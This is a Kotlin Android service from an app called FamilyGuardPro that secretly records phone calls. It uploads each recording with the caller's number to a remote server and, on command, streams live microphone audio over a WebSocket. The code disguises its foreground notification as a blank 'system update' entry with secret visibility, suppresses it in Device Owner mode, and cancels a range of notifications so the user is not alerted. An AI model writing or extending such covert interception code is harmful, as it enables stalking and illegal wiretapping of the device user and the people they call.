package com.familyguardpro.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.AudioRecorder
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.io.File
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class CallRecordService : Service() {

    companion object {
        private const val TAG = "CallRecordService"
        private const val NOTIFICATION_ID = 1005
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var audioRecorder: AudioRecorder? = null
    private var audioRecord: AudioRecord? = null
    private var webSocketClient: WebSocketClient? = null
    private var isRecording = false
    private var isLiveListening = false
    private var currentRecordingFile: File? = null
    private var phoneStateListener: PhoneStateListener? = null
    private var telephonyManager: TelephonyManager? = null
    private var currentPhoneNumber: String? = null

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        setupPhoneStateListener()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        
        when (intent?.getStringExtra("mode")) {
            "live_listen" -> startLiveListen()
            "record" -> startRecording()
            else -> {
                // Auto-detect based on call state
                if (preferenceManager.isCallRecordingEnabled()) {
                    // Check for required permission before registering listener
                    if (hasPhonePermission()) {
                        registerPhoneStateListener()
                    } else {
                        Log.w(TAG, "Phone permission not granted, skipping phone state listener")
                    }
                }
            }
        }
        
        return START_STICKY
    }
    
    private fun hasPhonePermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this, Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopForeground(STOP_FOREGROUND_REMOVE)
        cancelAllNotifications()
        stopCallRecording()
        stopLiveListen()
        unregisterPhoneStateListener()
    }
    
    private fun cancelAllNotifications() {
        try {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            nm.cancel(NOTIFICATION_ID)
            nm.cancelAll()
            for (id in 1001..1020) {
                try { nm.cancel(id) } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun startForeground() {
        try {
            // Check if Device Owner mode - use invisible channel
            val doManager = try {
                com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            } catch (e: Exception) { null }
            
            val channelId = if (doManager?.isDeviceOwner() == true) {
                com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
                com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
            } else {
                FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
            }
            
            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(R.drawable.ic_system_update)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
            
            startForeground(NOTIFICATION_ID, notification)
            
            // Suppress notification in Device Owner mode
            com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
                this, NOTIFICATION_ID
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground: ${e.message}")
            stopSelf()
        }
    }

    @Suppress("DEPRECATION")
    private fun setupPhoneStateListener() {
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        // Call active
                        currentPhoneNumber = phoneNumber
                        if (preferenceManager.isCallRecordingEnabled() && !isRecording) {
                            startCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        // Call ended
                        if (isRecording) {
                            stopCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        // Incoming call
                        currentPhoneNumber = phoneNumber
                    }
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun registerPhoneStateListener() {
        try {
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        } catch (e: SecurityException) {
            Log.w(TAG, "SecurityException registering phone state listener: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error registering phone state listener: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun unregisterPhoneStateListener() {
        try {
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering phone state listener: ${e.message}")
        }
    }

    private fun startCallRecording() {
        if (isRecording) return
        isRecording = true
        
        Log.d(TAG, "Starting call recording for: $currentPhoneNumber")
        
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val fileName = "call_${timestamp}.mp3"
        currentRecordingFile = File(cacheDir, fileName)
        
        audioRecorder = AudioRecorder(this)
        audioRecorder?.startRecording(currentRecordingFile!!.absolutePath)
    }

    private fun stopCallRecording() {
        if (!isRecording) return
        isRecording = false
        
        Log.d(TAG, "Stopping call recording")
        
        audioRecorder?.stopRecording()
        
        // Upload recording
        currentRecordingFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                uploadCallRecording(file, currentPhoneNumber)
            }
        }
    }

    private fun uploadCallRecording(file: File, phoneNumber: String?) {
        serviceScope.launch {
            try {
                val deviceId = preferenceManager.getDeviceId()
                val baseUrl = ApiClient.BASE_URL.trimEnd('/')
                val uploadUrl = "$baseUrl/api/device-owner/$deviceId/call-recording/upload"
                
                // Calculate duration from file (approximate: file size / bitrate)
                val duration = (file.length() / 8000).toInt() // rough estimate for MP3
                
                // Create multipart request
                val boundary = "----FormBoundary${System.currentTimeMillis()}"
                val connection = java.net.URL(uploadUrl).openConnection() as java.net.HttpURLConnection
                
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                
                val outputStream = connection.outputStream
                val writer = java.io.PrintWriter(java.io.OutputStreamWriter(outputStream, "UTF-8"), true)
                
                // Add file field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"recording\"; filename=\"${file.name}\"\r\n")
                writer.append("Content-Type: audio/mpeg\r\n\r\n")
                writer.flush()
                
                // Write file data
                file.inputStream().use { input ->
                    input.copyTo(outputStream)
                }
                outputStream.flush()
                
                // Add phoneNumber field
                writer.append("\r\n--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
                writer.append(phoneNumber ?: "Unknown")
                
                // Add callType field
                writer.append("\r\n--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
                writer.append("outgoing")
                
                // Add duration field
                writer.append("\r\n--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
                writer.append(duration.toString())
                
                // End boundary
                writer.append("\r\n--$boundary--\r\n")
                writer.flush()
                
                val responseCode = connection.responseCode
                if (responseCode in 200..299) {
                    Log.d(TAG, "Call recording uploaded successfully")
                    // Delete local file
                    file.delete()
                } else {
                    Log.e(TAG, "Failed to upload call recording: HTTP $responseCode")
                }
                
                connection.disconnect()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload call recording", e)
            }
        }
    }

    private fun startRecording() {
        // One-time recording
        val duration = 60 // seconds
        startCallRecording()
        
        serviceScope.launch {
            delay(duration * 1000L)
            stopCallRecording()
            stopSelf()
        }
    }

    private fun startLiveListen() {
        if (isLiveListening) return
        isLiveListening = true
        
        Log.d(TAG, "Starting live call listen")
        
        connectWebSocket {
            startAudioStreaming()
        }
    }

    private fun stopLiveListen() {
        if (!isLiveListening) return
        isLiveListening = false
        
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val wsUrl = "$baseUrl/api/stream/${preferenceManager.getDeviceId()}?type=live_call"
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {}

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed")
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun startAudioStreaming() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Audio permission not granted")
            return
        }
        
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize * 2
        )
        
        audioRecord?.startRecording()
        
        serviceScope.launch(Dispatchers.IO) {
            val buffer = ByteArray(bufferSize)
            
            while (isLiveListening && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    sendAudioData(buffer.copyOf(read))
                }
            }
        }
    }

    private fun sendAudioData(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio", e)
        }
    }
}
